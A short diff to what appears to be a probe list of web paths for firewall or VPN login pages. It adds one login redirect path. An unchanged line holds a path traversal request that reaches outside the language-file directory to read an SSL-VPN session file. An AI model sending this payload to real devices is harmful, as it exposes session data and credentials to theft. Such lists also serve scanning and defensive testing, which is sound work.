@@ -1,3 +1,4 @@
 /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
 /remote/login
 /login
+/login?redir=/ng
